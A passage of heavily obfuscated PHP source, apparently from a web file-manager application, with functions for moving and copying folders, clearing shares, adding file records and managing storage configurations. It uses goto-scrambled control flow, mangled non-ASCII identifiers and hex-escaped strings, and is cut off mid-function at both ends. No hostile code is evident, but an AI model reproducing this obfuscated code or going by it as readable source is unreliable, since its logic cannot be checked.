fÙÀù³‡ÁÍ: if ($fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[405]] == $c¦Å«·­‘×[87] && $DÍî²²»ö¢) { $this->folderSizeResetChildren($F»¾ÔÇ³Ÿ); } Model($c¦Å«·­‘×[193])->linkAdd($E‰ÒÈõ”›[$c¦Å«·­‘×[555]]); if ($DÍî²²»ö¢ && $E‰ÒÈõ”›[$c¦Å«·­‘×[587]]) { $this->removeNow($fÈ±ø…ƒç‡, !1); } goto C¼ç¾ĞÕœ; f¤ªøâŞÔ’: $this->updateModifyTime($fŸŠ†İÍ¨); Model($c¦Å«·­‘×[559])->eventMove($fÈ±ø…ƒç‡, $fé¬ÒÎ¾¯Í[$c¦Å«·­‘×[493]], $AğøÍ½‰ÌÂ); Hook::trigger($c¦Å«·­‘×[586], $cğƒÌ¡´Ú¾); goto E¶‚¥Í¡’»; fÙï–ÍˆÒ: } private function _move($c„Â¢‘Ì³İ, $dÎ†•¥¼ÂŒ, $f¢Û­„”½, &$bíÉª— š, $A¬á„²ß†Î = '') { goto a·«ÆÃìÇ; b–«à £‚: return $bé»­§ó‚ô; goto e˜ì´Ò„Ë; D¥¤¯èÈ‹Ø: $a¼Ø¹Ú Ü = $A¬á„²ß†Î ? $A¬á„²ß†Î : $BƒÆ‘èáÚ¨[$B¤¡ŠÁ¡›[28]]; $AæØ¼Í§Îæ = $this->fileNameExistCache($dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü); $this->lockMoveStart($c„Â¢‘Ì³İ); goto D¾ÑœÑ‹–â; a·«ÆÃìÇ: $B¤¡ŠÁ¡› =& $_SERVER[›èö’ù¤]; $BƒÆ‘èáÚ¨ = $this->sourceInfo($c„Â¢‘Ì³İ); $Eõäˆ˜³ÄŒ = $BƒÆ‘èáÚ¨[$B¤¡ŠÁ¡›[405]] == $B¤¡ŠÁ¡›[87]; goto D¥¤¯èÈ‹Ø; D¾ÑœÑ‹–â: $this->lockWriteStart($dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü); if (!$AæØ¼Í§Îæ) { return $this->_moveForce($c„Â¢‘Ì³İ, $dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü); } $bé»­§ó‚ô = $AæØ¼Í§Îæ; goto e ½º¡İÍ; e ½º¡İÍ: $E®Ëøğ = !1; if ($Eõäˆ˜³ÄŒ) { if ($f¢Û­„”½ == REPEAT_RENAME_FOLDER) { $a¼Ø¹Ú Ü = $this->fileNameAuto($dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü, $f¢Û­„”½, $Eõäˆ˜³ÄŒ); $bé»­§ó‚ô = $this->_moveForce($c„Â¢‘Ì³İ, $dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü); } else { if ($f¢Û­„”½ == REPEAT_RENAME_FOLDER) { $f¢Û­„”½ = REPEAT_RENAME; } $AÍïß¹—à = $this->_childrenListSelect($c„Â¢‘Ì³İ); foreach ($AÍïß¹—à as $F‰ ¾î¦Í) { $this->_move($F‰ ¾î¦Í[$B¤¡ŠÁ¡›[397]], $AæØ¼Í§Îæ, $f¢Û­„”½, $bíÉª— š); } $E®Ëøğ = !0; } } else { if ($f¢Û­„”½ == REPEAT_SKIP) { $E®Ëøğ = !0; } else { if ($f¢Û­„”½ == REPEAT_RENAME || $f¢Û­„”½ == REPEAT_RENAME_FOLDER) { $a¼Ø¹Ú Ü = $this->fileNameAuto($dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü, $f¢Û­„”½, $Eõäˆ˜³ÄŒ); $bé»­§ó‚ô = $this->_moveForce($c„Â¢‘Ì³İ, $dÎ†•¥¼ÂŒ, $a¼Ø¹Ú Ü); } else { if ($f¢Û­„”½ == REPEAT_REPLACE) { $a–îªÑˆßë = $this->sourceInfoCache($AæØ¼Í§Îæ); $C·¯àïßÑŞ = $this->fileHistory($a–îªÑˆßë, $BƒÆ‘èáÚ¨[$B¤¡ŠÁ¡›[462]], $BƒÆ‘èáÚ¨[$B¤¡ŠÁ¡›[78]]); $E®Ëøğ = !0; if ($C·¯àïßÑŞ) { $bíÉª— š[$B¤¡ŠÁ¡›[555]][] = $BƒÆ‘èáÚ¨[$B¤¡ŠÁ¡›[462]]; } } } } } if ($E®Ëøğ && !$bíÉª— š[$B¤¡ŠÁ¡›[587]]) { $bíÉª— š[$B¤¡ŠÁ¡›[587]] = !0; } goto b–«à £‚; e˜ì´Ò„Ë: } private function _moveForce($a¼•Ô’ˆğ, $Eâ¿ËŠÕ», $b†½ÊÓÖÄ) { goto b†øÍ„Ÿ‡Ñ; e´İ¢ÏÉæì: if ($A¥ÂŞ’ôœ) { $B¢ÖÄô÷ôÑ = array($A†µĞ®ÃÃœ[579] => array($A†µĞ®ÃÃœ[539], $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[516]] . $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[397]] . $A†µĞ®ÃÃœ[540])); $fœè÷Â¶çš = $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[516]] . $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[397]] . $A†µĞ®ÃÃœ[47]; $fŠ§äî®”Ø = $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[516]] . $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[397]] . $A†µĞ®ÃÃœ[47] . $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[397]] . $A†µĞ®ÃÃœ[47]; $a©”…¨‹æÛ = array($A†µĞ®ÃÃœ[579] => array($A†µĞ®ÃÃœ[588], "\x72\145\160\x6c\x61\143\145\50\160\x61\x72\145\156\x74\x4c\145\166\x65\154\54\47{$fœè÷Â¶çš}\x27\54\x27{$fŠ§äî®”Ø}\47\51"), $A†µĞ®ÃÃœ[575] => $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[406]], $A†µĞ®ÃÃœ[576] => $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[499]]); if ($Bõ‘æ¿óÎ’) { $a©”…¨‹æÛ[$A†µĞ®ÃÃœ[424]] = 0; } $this->where($B¢ÖÄô÷ôÑ)->data($a©”…¨‹æÛ)->save(); } $this->where(array($A†µĞ®ÃÃœ[412] => $a¼•Ô’ˆğ))->data($AÖ‰‹’õ¯)->save(); return $a¼•Ô’ˆğ; goto E£÷ªšÓĞÔ; b†øÍ„Ÿ‡Ñ: $A†µĞ®ÃÃœ =& $_SERVER[›èö’ù¤]; $B¨ÂÛ¢Õ³© = $this->sourceInfo($a¼•Ô’ˆğ); $CÔÅ»»¥Ã = $this->sourceInfo($Eâ¿ËŠÕ»); goto D¸äÇÒĞ¢½; d„¯³ÅÜÜà: if (!$b“ßï˜ÂÜ‹ && $this->moveClearAuth) { Model($A†µĞ®ÃÃœ[497])->authClear($a¼•Ô’ˆğ); } $Bõ‘æ¿óÎ’ = $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[425]] == $A†µĞ®ÃÃœ[87] && $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[425]] != $A†µĞ®ÃÃœ[87]; if ($Bõ‘æ¿óÎ’) { $AÖ‰‹’õ¯[$A†µĞ®ÃÃœ[424]] = 0; } goto e´İ¢ÏÉæì; D¸äÇÒĞ¢½: $A¥ÂŞ’ôœ = $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[405]] == $A†µĞ®ÃÃœ[87]; $AÖ‰‹’õ¯ = array($A†µĞ®ÃÃœ[396] => $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[397]], $A†µĞ®ÃÃœ[579] => $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[516]] . $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[397]] . $A†µĞ®ÃÃœ[47], $A†µĞ®ÃÃœ[575] => $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[406]], $A†µĞ®ÃÃœ[576] => $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[499]], $A†µĞ®ÃÃœ[578] => USER_ID, $A†µĞ®ÃÃœ[415] => $b†½ÊÓÖÄ); $b“ßï˜ÂÜ‹ = $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[406]] == SourceModel::TYPE_GROUP && $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[406]] == SourceModel::TYPE_GROUP && $B¨ÂÛ¢Õ³©[$A†µĞ®ÃÃœ[499]] == $CÔÅ»»¥Ã[$A†µĞ®ÃÃœ[499]]; goto d„¯³ÅÜÜà; E£÷ªšÓĞÔ: } private function clearShare($A‚ËÖ¸×, $CÖ¾ß‡ÉØ) { goto FØ‘¿Ç°¢; A´×³Õõõ´: if (!$f›îõÙÀÃ) { return; } $Cø‰ğ¿Ø‹ô = array($d™¬´¨‘â[397] => array($d™¬´¨‘â[7], $f›îõÙÀÃ), $d™¬´¨‘â[490] => 1); $dÏÚ«»î¾Œ = Model($d™¬´¨‘â[590])->field($d™¬´¨‘â[483])->where($Cø‰ğ¿Ø‹ô)->select(); goto CëĞôôôä¥; CëĞôôôä¥: if (!$dÏÚ«»î¾Œ) { return; } $dÏÚ«»î¾Œ = array_to_keyvalue($dÏÚ«»î¾Œ, $d™¬´¨‘â[33], $d™¬´¨‘â[483]); $Cø‰ğ¿Ø‹ô = array($d™¬´¨‘â[483] => array($d™¬´¨‘â[7], $dÏÚ«»î¾Œ)); goto c£„‰ô›Ñ; b†‘³ÎòÚµ: if ($c¡İ¤¸º³–[$d™¬´¨‘â[499]] == $d¢Ã§­Öæâ[$d™¬´¨‘â[499]] && $c¡İ¤¸º³–[$d™¬´¨‘â[406]] == $d™¬´¨‘â[589]) { return; } $Cø‰ğ¿Ø‹ô = array($d™¬´¨‘â[516] => array($d™¬´¨‘â[539], $c¡İ¤¸º³–[$d™¬´¨‘â[516]] . $A‚ËÖ¸× . $d™¬´¨‘â[540])); $f›îõÙÀÃ = $this->field($d™¬´¨‘â[412])->where($Cø‰ğ¿Ø‹ô)->getField($d™¬´¨‘â[397], !0); goto A´×³Õõõ´; c£„‰ô›Ñ: Model($d™¬´¨‘â[590])->where($Cø‰ğ¿Ø‹ô)->save(array($d™¬´¨‘â[490] => 0)); Model($d™¬´¨‘â[591])->where($Cø‰ğ¿Ø‹ô)->delete(); goto fÆ¥Ÿ‰•½; FØ‘¿Ç°¢: $d™¬´¨‘â =& $_SERVER[›èö’ù¤]; $c¡İ¤¸º³– = $this->sourceInfo($A‚ËÖ¸×); $d¢Ã§­Öæâ = $this->sourceInfo($CÖ¾ß‡ÉØ); goto b†‘³ÎòÚµ; fÆ¥Ÿ‰•½: } public function copyFolderFromIO($B×ï¯¸¡î…, $aÎ¡´¤äÀ, $AÎÙÉ¿ÉÑä, $Eñ¡¥‰àğÑ, $e÷ÌĞˆÑŸê, $aƒãÆ©ŞÆÊ = false) { goto eÚª¼Á¤ƒâ; cìÈË¼šÑ’: Hook::trigger($CĞÜ±µ„[594]); if ($AÜ½¥ª¨¼) { $this->folderSizeResetChildren($AÜ½¥ª¨¼); } $this->_childrenListClear(); goto AàóßàĞ‘; AàóßàĞ‘: Model($CĞÜ±µ„[558])->addAll($f²®áØ‰³š[$CĞÜ±µ„[556]], array(), !0); Model($CĞÜ±µ„[559])->eventCopy($AÜ½¥ª¨¼); $this->saveAll($f²®áØ‰³š[$CĞÜ±µ„[557]]); goto aŠ™ÒˆŞ×©; d™ã‹Ã×ë: $Bíò‡à‚í = $this->fileNameExist($AÎÙÉ¿ÉÑä, $cÚ†ÇÛ…Ô›); $AÜ½¥ª¨¼ = $this->mkdir($AÎÙÉ¿ÉÑä, $cÚ†ÇÛ…Ô›, $Eñ¡¥‰àğÑ); if (!$Bíò‡à‚í || $Eñ¡¥‰àğÑ == REPEAT_RENAME_FOLDER) { $Eñ¡¥‰àğÑ = !1; } goto fÂÕÌ®Ï„•; aŠ™ÒˆŞ×©: Model($CĞÜ±µ„[465])->linkAdd($f²®áØ‰³š[$CĞÜ±µ„[555]]); Model($CĞÜ±µ„[465])->remove($f²®áØ‰³š[$CĞÜ±µ„[592]]); $this->folderSizeReset($AÎÙÉ¿ÉÑä); goto F˜ñ†ÃèŒİ; eÚª¼Á¤ƒâ: $CĞÜ±µ„ =& $_SERVER[›èö’ù¤]; $f²®áØ‰³š = array($CĞÜ±µ„[556] => array(), $CĞÜ±µ„[557] => array(), $CĞÜ±µ„[555] => array(), $CĞÜ±µ„[592] => array()); $cÚ†ÇÛ…Ô› = $aƒãÆ©ŞÆÊ ? $aƒãÆ©ŞÆÊ : $B×ï¯¸¡î…->pathThis($aÎ¡´¤äÀ); goto d™ã‹Ã×ë; fÂÕÌ®Ï„•: if ($Bíò‡à‚í) { $this->_childrenAllMake($Bíò‡à‚í); } Hook::trigger($CĞÜ±µ„[593]); $this->_copyChildTo($B×ï¯¸¡î…, $aÎ¡´¤äÀ, $AÜ½¥ª¨¼, $Eñ¡¥‰àğÑ, $f²®áØ‰³š, $e÷ÌĞˆÑŸê); goto cìÈË¼šÑ’; F˜ñ†ÃèŒİ: $this->updateModifyTime($AÎÙÉ¿ÉÑä); return $AÜ½¥ª¨¼; goto aó’Ş¼¶ñÚ; aó’Ş¼¶ñÚ: } private function _copyChildTo($bîï®¥„³—, $cğªæ½‹“ù, $b›ÀŒö¸èä, $bºŒø“õ˜â, &$d­ù¯Ìãí’, $d£è·š¥«’) { goto e¡ƒÓç‹æµ; Fâ¢µùæ„: if (!empty($B¤› ÈšÛ )) { $this->addAll($B¤› ÈšÛ ); $this->_childrenListSelect($b›ÀŒö¸èä); } $e¦­½÷™À = $this->_childrenList($b›ÀŒö¸èä); $e¦­½÷™À = array_to_keyvalue($e¦­½÷™À, $D¬õøì•Ë¥[28]); goto fËÖ´÷‹¸ã; fËÖ´÷‹¸ã: foreach ($E„ˆ‹¡˜¦Í as $aùª¤˜Í¹½) { $A«šËÍˆ¤Ï = $e¦­½÷™À[$aùª¤˜Í¹½[$D¬õøì•Ë¥[28]]]; $DïˆÔÉ—µ£ = $A«šËÍˆ¤Ï[$D¬õøì•Ë¥[397]]; $this->_copyApplyMeta($A«šËÍˆ¤Ï, $d­ù¯Ìãí’); if ($aùª¤˜Í¹½[$D¬õøì•Ë¥[29]] == $D¬õøì•Ë¥[77]) { $aùª¤˜Í¹½[$D¬õøì•Ë¥[76]] = $bîï®¥„³—->getPathInner($aùª¤˜Í¹½[$D¬õøì•Ë¥[76]]); $this->_copyChildTo($bîï®¥„³—, $aùª¤˜Í¹½[$D¬õøì•Ë¥[76]], $DïˆÔÉ—µ£, $bºŒø“õ˜â, $d­ù¯Ìãí’, $d£è·š¥«’); } } goto C§í³“Ğ£; a—™š Ô: $d·ª­’Ï¬ = $d·ª­’Ï¬ ? $d·ª­’Ï¬ : array($D¬õøì•Ë¥[74] => array(), $D¬õøì•Ë¥[75] => array()); $E„ˆ‹¡˜¦Í = array_merge($d·ª­’Ï¬[$D¬õøì•Ë¥[74]], $d·ª­’Ï¬[$D¬õøì•Ë¥[75]]); $dƒ„Ş…È…½ = $this->_addFiles($bîï®¥„³—, $d·ª­’Ï¬[$D¬õøì•Ë¥[74]], $d£è·š¥«’); goto CÎËÒÁØÅƒ; CÎËÒÁØÅƒ: $B¤› ÈšÛ  = array(); foreach ($E„ˆ‹¡˜¦Í as &$aùª¤˜Í¹½) { goto Dùê„«­¸ö; Dùê„«­¸ö: if (isset($dƒ„Ş…È…½[$aùª¤˜Í¹½[$D¬õøì•Ë¥[28]]])) { $aùª¤˜Í¹½ = $dƒ„Ş…È…½[$aùª¤˜Í¹½[$D¬õøì•Ë¥[28]]]; } $aùª¤˜Í¹½[$D¬õøì•Ë¥[405]] = $aùª¤˜Í¹½[$D¬õøì•Ë¥[29]] == $D¬õøì•Ë¥[77]; $aùª¤˜Í¹½[$D¬õøì•Ë¥[407]] = _get($aùª¤˜Í¹½, $D¬õøì•Ë¥[168], $D¬õøì•Ë¥[33]); goto cé¶·¶¬¸Â; cé¶·¶¬¸Â: $aùª¤˜Í¹½[$D¬õøì•Ë¥[78]] = _get($aùª¤˜Í¹½, $D¬õøì•Ë¥[78], 0); $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]] = _get($aùª¤˜Í¹½, $D¬õøì•Ë¥[462], 0); if (!isset($aùª¤˜Í¹½[$D¬õøì•Ë¥[595]]) && $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]]) { $d­ù¯Ìãí’[$D¬õøì•Ë¥[592]][] = $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]]; } goto FÌ¸Ø; FÌ¸Ø: if ($bºŒø“õ˜â) { $FŠÔ¼÷î = $this->fileNameExistCache($b›ÀŒö¸èä, $aùª¤˜Í¹½[$D¬õøì•Ë¥[28]]); if ($FŠÔ¼÷î) { if ($aùª¤˜Í¹½[$D¬õøì•Ë¥[405]] || $bºŒø“õ˜â == REPEAT_SKIP) { continue; } if ($bºŒø“õ˜â == REPEAT_REPLACE) { $A«šËÍˆ¤Ï = $this->sourceInfoCache($FŠÔ¼÷î); $c¦ÚÄ¿íôÁ = $this->fileHistory($A«šËÍˆ¤Ï, $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]], $aùª¤˜Í¹½[$D¬õøì•Ë¥[78]]); if ($c¦ÚÄ¿íôÁ) { $d­ù¯Ìãí’[$D¬õøì•Ë¥[555]][] = $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]]; } continue; } else { if ($bºŒø“õ˜â == REPEAT_RENAME) { $aùª¤˜Í¹½[$D¬õøì•Ë¥[28]] = $this->fileNameAutoCache($b›ÀŒö¸èä, $aùª¤˜Í¹½[$D¬õøì•Ë¥[28]], $bºŒø“õ˜â, !1); } } } } if (!$aùª¤˜Í¹½[$D¬õøì•Ë¥[405]] && $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]]) { $d­ù¯Ìãí’[$D¬õøì•Ë¥[555]][] = $aùª¤˜Í¹½[$D¬õøì•Ë¥[462]]; } $B¤› ÈšÛ [] = $this->_makeItemData($aùª¤˜Í¹½, $CÖïÈ÷ÔŠ‹, $aùª¤˜Í¹½[$D¬õøì•Ë¥[28]]); goto AôåëµÑéÍ; AôåëµÑéÍ: } unset($aùª¤˜Í¹½); goto Fâ¢µùæ„; e¡ƒÓç‹æµ: $D¬õøì•Ë¥ =& $_SERVER[›èö’ù¤]; $CÖïÈ÷ÔŠ‹ = $this->sourceInfoCache($b›ÀŒö¸èä); $d·ª­’Ï¬ = $bîï®¥„³—->listPath($cğªæ½‹“ù); goto a—™š Ô; C§í³“Ğ£: } private function _addFiles($D„Õ¿º‰ãª, $C†Ú»åÈ, $fËŸˆšËï—) { goto BÕÑ‚ïœçÜ; d…“‡Àâé†: foreach ($C†Ú»åÈ as &$bê‡›Û‰Š) { goto aøó À’îè; fäßäÊì½½: if (count($aøô¯š‹‘[$C²ù³åµó]) > 1) { $bê‡›Û‰Š[$CÑöìò—„º[595]] = !0; } goto DÉîãéÇï; eÃ°é‰›ä: $bê‡›Û‰Š[$CÑöìò—„º[170]] = $C²ù³åµó; Hook::trigger($CÑöìò—„º[597], $bê‡›Û‰Š); $aøô¯š‹‘[$C²ù³åµó][] =& $bê‡›Û‰Š; goto fäßäÊì½½; aøó À’îè: Hook::trigger($CÑöìò—„º[596], $bê‡›Û‰Š); $bê‡›Û‰Š[$CÑöìò—„º[76]] = $D„Õ¿º‰ãª->getPathInner($bê‡›Û‰Š[$CÑöìò—„º[76]]); $f¡ÆÒ‘÷·Ø = $D„Õ¿º‰ãª->hashSimple($bê‡›Û‰Š[$CÑöìò—„º[76]]); goto bä«ĞÔ”ùö; bä«ĞÔ”ùö: $C²ù³åµó = $D„Õ¿º‰ãª->hashMd5($bê‡›Û‰Š[$CÑöìò—„º[76]]); if (strlen($C²ù³åµó) > 10 && !isset($aøô¯š‹‘[$C²ù³åµó])) { $aøô¯š‹‘[$C²ù³åµó] = array(); } $bê‡›Û‰Š[$CÑöìò—„º[171]] = $f¡ÆÒ‘÷·Ø; goto eÃ°é‰›ä; DÉîãéÇï: } unset($bê‡›Û‰Š); $b ‚ïò­çˆ = array($CÑöìò—„º[170] => array($CÑöìò—„º[7], array_keys($aøô¯š‹‘))); goto Bğ†›ÂÇÑ×; føŠÖÔƒ¹Ø: foreach ($dÍÏ²ƒÌØÅ as $E£¢ç™ÍŠØ) { if (!isset($aøô¯š‹‘[$E£¢ç™ÍŠØ[$CÑöìò—„º[170]]])) { continue; } $fÉæøÒ•—ó = $aøô¯š‹‘[$E£¢ç™ÍŠØ[$CÑöìò—„º[170]]]; foreach ($fÉæøÒ•—ó as &$bê‡›Û‰Š) { $bê‡›Û‰Š[$CÑöìò—„º[462]] = $E£¢ç™ÍŠØ[$CÑöìò—„º[462]]; $bê‡›Û‰Š[$CÑöìò—„º[595]] = !0; } unset($bê‡›Û‰Š); } $AàÎ…šöİ‰ = array(); foreach ($C†Ú»åÈ as $f¿è†ëÑª) { if (isset($f¿è†ëÑª[$CÑöìò—„º[595]]) && $f¿è†ëÑª[$CÑöìò—„º[595]]) { continue; } $CˆÀÅá°¶á = $D„Õ¿º‰ãª->getPathInner($f¿è†ëÑª[$CÑöìò—„º[76]]); $EÎÄ˜ÑÕßŒ = $eõ¾İä›ª’->addFileMake($CˆÀÅá°¶á, $f¿è†ëÑª[$CÑöìò—„º[78]], $f¿è†ëÑª[$CÑöìò—„º[171]], $f¿è†ëÑª[$CÑöìò—„º[170]], $f¿è†ëÑª[$CÑöìò—„º[28]], $fËŸˆšËï—); $AàÎ…šöİ‰[] = $EÎÄ˜ÑÕßŒ; } goto F·Ï¦¦ŒîÑ; BÕÑ‚ïœçÜ: $CÑöìò—„º =& $_SERVER[›èö’ù¤]; if (!$C†Ú»åÈ || count($C†Ú»åÈ) == 0) { return array(); } $aøô¯š‹‘ = array(); goto d…“‡Àâé†; bæ¶œÚİÂ: foreach ($C†Ú»åÈ as $fÉ·×½àº) { $c¸³àƒÇÎÉ[$fÉ·×½àº[$CÑöìò—„º[28]]] = $fÉ·×½àº; } return $c¸³àƒÇÎÉ; goto b’¾ó§½ˆâ; F·Ï¦¦ŒîÑ: $eõ¾İä›ª’->addAll($AàÎ…šöİ‰); $b ‚ïò­çˆ = array($CÑöìò—„º[170] => array($CÑöìò—„º[7], array_keys($aøô¯š‹‘))); $dÍÏ²ƒÌØÅ = $eõ¾İä›ª’->where($b ‚ïò­çˆ)->select(); goto Cƒ±æ”•; Bğ†›ÂÇÑ×: $eõ¾İä›ª’ = Model($CÑöìò—„º[598]); $dÍÏ²ƒÌØÅ = $eõ¾İä›ª’->where($b ‚ïò­çˆ)->select(); $dÍÏ²ƒÌØÅ = $dÍÏ²ƒÌØÅ ? $dÍÏ²ƒÌØÅ : array(); goto føŠÖÔƒ¹Ø; Cƒ±æ”•: $dÍÏ²ƒÌØÅ = $dÍÏ²ƒÌØÅ ? $dÍÏ²ƒÌØÅ : array(); foreach ($dÍÏ²ƒÌØÅ as $E£¢ç™ÍŠØ) { if (!isset($aøô¯š‹‘[$E£¢ç™ÍŠØ[$CÑöìò—„º[170]]])) { continue; } $B© Šñˆâæ =& $aøô¯š‹‘[$E£¢ç™ÍŠØ[$CÑöìò—„º[170]]]; foreach ($B© Šñˆâæ as &$bê‡›Û‰Š) { $bê‡›Û‰Š[$CÑöìò—„º[462]] = $E£¢ç™ÍŠØ[$CÑöìò—„º[462]]; } unset($bê‡›Û‰Š); } $c¸³àƒÇÎÉ = array(); goto bæ¶œÚİÂ; b’¾ó§½ˆâ: } } define($_SERVER[›èö’ù¤][599], $_SERVER[›èö’ù¤][600]); goto eÙğÂÔğ; B‚–ê…ãéÂ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\163\x6f\x75\162\x63\x65\x53\145\143\162\x65\x74\x4c\151\163\164"; public $field = array("\163\157\165\162\143\x65\x49\104", "\x74\x79\x70\x65\111\x44", "\x63\162\x65\x61\164\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\163\164\157\x72\x61\147\x65\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\x69\172\145\115\141\170", "\x73\171\x73\164\x65\x6d", "\144\145\146\x61\165\154\x74", "\144\x72\x69\x76\x65\x72", "\143\x6f\156\146\151\147"); public function listData($A½‹éàãÌ = false, $dòƒòèÁö = "\155\x6f\x64\151\x66\x79\124\x69\155\x65", $eÒµĞ¶¡â = false) { $cÑĞÂÅ…¼¬ =& $_SERVER[›èö’ù¤]; $Bİâ¼Øâ¥ = parent::listData($A½‹éàãÌ, $dòƒòèÁö, $eÒµĞ¶¡â); if ($A½‹éàãÌ) { return $Bİâ¼Øâ¥; } $Dã‚ï‰Ë‡ğ = $this->ioSizeUseGet(array_to_keyvalue($Bİâ¼Øâ¥, $cÑĞÂÅ…¼¬[33], $cÑĞÂÅ…¼¬[395])); foreach ($Bİâ¼Øâ¥ as $aÜÔÎÇÔÒ„ => $DºìòÕ) { unset($Bİâ¼Øâ¥[$aÜÔÎÇÔÒ„][$cÑĞÂÅ…¼¬[6]]); $Bİâ¼Øâ¥[$aÜÔÎÇÔÒ„][$cÑĞÂÅ…¼¬[1706]] = isset($Dã‚ï‰Ë‡ğ[$DºìòÕ[$cÑĞÂÅ…¼¬[395]]]) ? $Dã‚ï‰Ë‡ğ[$DºìòÕ[$cÑĞÂÅ…¼¬[395]]] : 0; } return $Bİâ¼Øâ¥; } public function ioSizeUseGet($c¶Ğ¡ŸÒÍ·) { goto CõÌœœƒä¦; CõÌœœƒä¦: $f¹ˆÖï» =& $_SERVER[›èö’ù¤]; if (!$c¶Ğ¡ŸÒÍ·) { return array(); } $Cš”õ²èª‘ = $f¹ˆÖï»[2021] . implode($f¹ˆÖï»[47], $c¶Ğ¡ŸÒÍ·); goto BÅÎ—œĞàÈ; bğ¦œ°Òš•: Cache::set($Cš”õ²èª‘, $D·éÁõç„‡, 600); return $D·éÁõç„‡; goto E²áÃÉ¦Õ; BÅÎ—œĞàÈ: $D·éÁõç„‡ = Cache::get($Cš”õ²èª‘); if ($D·éÁõç„‡) { return $D·éÁõç„‡; } $A…êå¾°—ğ = array($f¹ˆÖï»[808] => $f¹ˆÖï»[395], $f¹ˆÖï»[2022] => $f¹ˆÖï»[78]); goto bİË‹™ÁÃ; bİË‹™ÁÃ: $Cğ¯ñèÎÖ½ = array($f¹ˆÖï»[808] => array($f¹ˆÖï»[7], $c¶Ğ¡ŸÒÍ·)); $D·éÁõç„‡ = Model($f¹ˆÖï»[771])->field($A…êå¾°—ğ)->where($Cğ¯ñèÎÖ½)->group($f¹ˆÖï»[808])->select(); $D·éÁõç„‡ = array_to_keyvalue($D·éÁõç„‡, $f¹ˆÖï»[395], $f¹ˆÖï»[78]); goto bğ¦œ°Òš•; E²áÃÉ¦Õ: } public function getConfig($F¸è•¸­ƒ—) { $Aƒƒ´×ŒÁÑ = parent::listData($F¸è•¸­ƒ—); return json_decode($Aƒƒ´×ŒÁÑ[$_SERVER[›èö’ù¤][6]], !0); } public function update($cŠÛêó’, $eÔ®¿”Ñ†Š) { goto E‰à¥äëİ¶; E’ööÍŒŒø: $Bšø¯“ÏØ = parent::update($cŠÛêó’, $eÔ®¿”Ñ†Š); if ($Bšø¯“ÏØ && $eÔ®¿”Ñ†Š[$cŠöà—‚Òç[34]]) { foreach ($C•óµ³±† as $dëò„˜¡»ñ) { if ($dëò„˜¡»ñ[$cŠöà—‚Òç[34]] && $dëò„˜¡»ñ[$cŠöà—‚Òç[395]] != $cŠÛêó’) { parent::update($dëò„˜¡»ñ[$cŠöà—‚Òç[395]], array($cŠöà—‚Òç[34] => 0)); } } } return $Bšø¯“ÏØ; goto d¯¿¨øŒ†ù; E‰à¥äëİ¶: $cŠöà—‚Òç =& $_SERVER[›èö’ù¤]; $eèï¢¤ğ¼ = $eÔ®¿”Ñ†Š[$cŠöà—‚Òç[28]]; $C•óµ³±† = array_to_keyvalue(parent::listData(), $cŠöà—‚Òç[28]); goto fà†ò‰‹‚Š; fà†ò‰‹‚Š: if (isset($C•óµ³±†[$eèï¢¤ğ¼]) && $C•óµ³±†[$eèï¢¤ğ¼][$cŠöà—‚Òç[395]] != $cŠÛêó’) { return !1; } if (isset($eÔ®¿”Ñ†Š[$cŠöà—‚Òç[2023]]) && $eÔ®¿”Ñ†Š[$cŠöà—‚Òç[2023]] == $cŠöà—‚Òç[87]) { $this->checkConfig($eÔ®¿”Ñ†Š); } unset($eÔ®¿”Ñ†Š[$cŠöà—‚Òç[2023]]); goto E’ööÍŒŒø; d¯¿¨øŒ†ù: } public function add($f¬ùÎˆ„ô²) { goto aƒƒ˜Üã·; bëÆÑ‹Ã‡ø: return $B¢µÅ‰šíä; goto B–Íô”İÑ„; aƒƒ˜Üã·: $CŸ÷¹¸Œ¡’ =& $_SERVER[›èö’ù¤]; $fÈÙÉñÂ¨ = array_to_keyvalue(parent::listData(), $CŸ÷¹¸Œ¡’[28]); if (isset($fÈÙÉñÂ¨[$f¬ùÎˆ„ô²[$CŸ÷¹¸Œ¡’[28]]])) { return !1; } goto b©ŸÆš¢; b©ŸÆš¢: $this->checkConfig($f¬ùÎˆ„ô²); $B¢µÅ‰šíä = parent::insert($f¬ùÎˆ„ô²); if ($B¢µÅ‰šíä && $f¬ùÎˆ„ô²[$CŸ÷¹¸Œ¡’[34]]) { foreach ($fÈÙÉñÂ¨ as $bãáƒµªğ•) { if ($bãáƒµªğ•[$CŸ÷¹¸Œ¡’[34]]) { parent::update($bãáƒµªğ•[$CŸ÷¹¸Œ¡’[395]], array($CŸ÷¹¸Œ¡’[34] => 0)); } } } goto 